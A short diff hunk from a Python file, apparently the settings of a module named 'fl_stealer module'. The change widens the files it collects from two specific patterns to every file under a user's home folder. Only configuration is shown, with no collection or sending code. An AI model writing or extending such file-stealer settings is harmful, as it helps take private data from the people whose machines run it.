@@ -7,7 +7,7 @@ import re
 
 custom_paths = ["/home/pawel/custom_folder"]
 special_paths = ["DOC"]
-files_to_find = [".*cum.*\.md","other\.json"]
+files_to_find = [".*"]
 module_name = "fl_stealer module"
 pub_key_size = 16
 
